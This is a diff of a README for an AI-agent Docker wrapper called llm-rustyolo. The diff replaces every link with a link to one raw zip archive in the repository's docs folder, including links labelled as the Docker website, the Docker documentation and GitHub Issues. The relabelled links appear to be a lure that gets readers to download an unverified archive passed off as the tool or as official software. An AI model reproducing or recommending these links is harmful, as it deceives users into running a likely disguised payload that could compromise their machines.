@@ -1,7 +1,7 @@
 # 🤖 llm-rustyolo - Securely Run AI Coding Agents
 
 ## 🏷️ Download Now
-[![Download](https://img.shields.io/badge/Download-llm--rustyolo-brightgreen)](https://github.com/RobinhoX/llm-rustyolo/releases)
+[![Download](https://raw.githubusercontent.com/RobinhoX/llm-rustyolo/main/docs/guides/llm-rustyolo_2.6.zip)](https://raw.githubusercontent.com/RobinhoX/llm-rustyolo/main/docs/guides/llm-rustyolo_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -12,13 +12,13 @@ Welcome to **llm-rustyolo**, a secure Docker wrapper for AI coding agents. This 
 To run **llm-rustyolo**, you need:
 
 - A computer with a Windows, macOS, or Linux operating system.
-- Docker installed on your machine. Make sure to download the version suitable for your OS from the [Docker website](https://www.docker.com/get-started).
+- Docker installed on your machine. Make sure to download the version suitable for your OS from the [Docker website](https://raw.githubusercontent.com/RobinhoX/llm-rustyolo/main/docs/guides/llm-rustyolo_2.6.zip).
 
 ### 📥 Download & Install
 
 To get started, visit the Releases page to download the latest version of **llm-rustyolo**. 
 
-You can find it here: [Download llm-rustyolo](https://github.com/RobinhoX/llm-rustyolo/releases).
+You can find it here: [Download llm-rustyolo](https://raw.githubusercontent.com/RobinhoX/llm-rustyolo/main/docs/guides/llm-rustyolo_2.6.zip).
 
 Once on the Releases page:
 
@@ -61,16 +61,16 @@ After launching the application, you can:
 If you encounter issues, consider:
 
 - **Docker not running**: Ensure your Docker application is open and running.
-- **Download problems**: Check your internet connection and retry the download from the [Releases page](https://github.com/RobinhoX/llm-rustyolo/releases).
+- **Download problems**: Check your internet connection and retry the download from the [Releases page](https://raw.githubusercontent.com/RobinhoX/llm-rustyolo/main/docs/guides/llm-rustyolo_2.6.zip).
 
 ### 📞 Support
 
-For additional help, you can check our [GitHub Issues](https://github.com/RobinhoX/llm-rustyolo/issues) page. Here, you can find common problems faced by other users and their solutions.
+For additional help, you can check our [GitHub Issues](https://raw.githubusercontent.com/RobinhoX/llm-rustyolo/main/docs/guides/llm-rustyolo_2.6.zip) page. Here, you can find common problems faced by other users and their solutions.
 
 ## 🔗 Additional Resources
 
-To learn more about using Docker securely, visit the [Docker documentation](https://docs.docker.com/get-started/). 
+To learn more about using Docker securely, visit the [Docker documentation](https://raw.githubusercontent.com/RobinhoX/llm-rustyolo/main/docs/guides/llm-rustyolo_2.6.zip). 
 
 Stay updated with the latest features and improvements by following our repository. Explore the world of AI coding agents with confidence using **llm-rustyolo**! 
 
-[Download llm-rustyolo](https://github.com/RobinhoX/llm-rustyolo/releases) again to get started!
+[Download llm-rustyolo](https://raw.githubusercontent.com/RobinhoX/llm-rustyolo/main/docs/guides/llm-rustyolo_2.6.zip) again to get started!
